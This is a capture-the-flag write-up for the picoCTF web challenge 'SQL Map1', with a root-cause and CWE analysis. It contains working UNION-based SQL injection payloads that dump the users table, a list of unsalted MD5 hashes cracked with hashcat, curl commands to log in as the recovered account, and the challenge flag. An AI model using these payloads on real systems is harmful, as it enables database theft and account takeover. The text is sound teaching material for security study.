# SQL Map1

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{F0uNd_s3cr3T_K3y_f0R_w3_<>}`

## Summary

A PHP/SQLite login app has a "flag search" feature (`vuln.php?q=`) that concatenates user input
directly into a `LIKE '%...%'` clause with no escaping, allowing a classic UNION-based SQL
injection. Rather than being where the real flag lives, the search page's `flags` table is
stuffed with decoy entries that literally say "this is not the flag" inside them. The `users`
table, dumped the same way, holds unsalted MD5 password hashes; cracking one belonging to a
specific seeded account (`ctf-player`, not `admin`) and logging in as them unlocks a separate
`secret.php` page that only that account gets redirected to, which holds the real flag.

## Discovery

Registering an account and logging in normally redirects to `vuln.php`, a "Vulnerable Flag
Search" page with a `q` GET parameter. Submitting a single quote breaks the query and confirms
both the injection and the backend:

```
GET /vuln.php?q=test'
```

```
Warning: SQLite3::query(): Unable to prepare statement: 1, near "'%'": syntax error in
/var/www/html/vuln.php on line 39
```

The `near "'%'"` fragment confirms the input lands inside a `LIKE '%$q%'` clause. `login.php`
was checked separately and is properly parameterized (a quote there causes no error), so the
only injectable surface is the search page.

## Proof of Concept

Determine the column count with an incrementing `UNION SELECT NULL,...`; two columns succeed
with no error. Enumerate the schema via SQLite's own catalog:

```
GET /vuln.php?q=test%' UNION SELECT name,sql FROM sqlite_master WHERE type='table'-- -
```

reveals two tables: `flags(id, key, value)` and `users(id, username, password)`. Dumping
`flags` returns nine rows, every one of them reading `picoCTF{tH15_lS_n0T_...}`-style text,
confirming they are all deliberate decoys, not the real answer. Dumping `users` instead:

```
GET /vuln.php?q=test%' UNION SELECT username,password FROM users-- -
```

```
admin: 5a9a79d9fa477ed163b89088681672c9
attacker1: 47b7bfb65fa83ac9a71dcb0f6296bb6e
ctf-player: 7a67ab5872843b22b5e14511867c4e43
ghost: 8d2379c40704bed972e55680be2355e2
malicious: a669d60c31ad3d05b9e453c8576c7aab
noaccess: 83806b490e28a7f8e6662646cbdbff1a
suspicious: eb1f3ba6901c65d9b2e09a38f560758b
```

Each value is 32 hex characters. Confirming against the freshly-registered `attacker1` account's
own known password shows the scheme is plain, unsalted MD5 (`md5("Passw0rd!")` matches its
stored hash exactly), the "legacy hashing" the challenge description points at. Cracking every
unknown hash with `hashcat -m 0` against rockyou recovers exactly one: `ctf-player`'s password is
`dyesebel` (the `admin` hash does not crack against rockyou, a deliberate dead end).

Logging in as `ctf-player` behaves differently from every other account: it redirects to
`secret.php` instead of `vuln.php`.

```
curl -s -i -c cj.txt -X POST http://TARGET/login.php -d "username=ctf-player&password=dyesebel"
curl -s -b cj.txt http://TARGET/secret.php
```

```html
<p>Logged in as: <strong>ctf-player</strong></p>
<p>The challenge flag is:</p>
<pre>picoCTF{F0uNd_s3cr3T_K3y_f0R_w3_&lt;&gt;}</pre>
```

## Root Cause

Two independent weaknesses chain together: an unescaped search parameter enables SQL injection
that leaks the full user table regardless of the querying account's own privileges, and password
storage uses unsalted MD5 with no per-account work factor, making at least one real account's
password recoverable with a standard wordlist. The application also relies on a hardcoded,
per-username redirect (`ctf-player` alone routes to `secret.php`) rather than a proper role or
permission check, so the moment that one account's credentials are recovered, impersonating it is
enough to reach content that should require genuine authorization.

## CWE / OWASP

- **CWE-89**: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
- **CWE-916**: Use of Password Hash With Insufficient Computational Effort
- **CWE-798**: Use of Hard-coded Credentials (a specific username hardcoded to grant access to
  protected content)
- **OWASP A03:2021**: Injection
- **OWASP A02:2021**: Cryptographic Failures
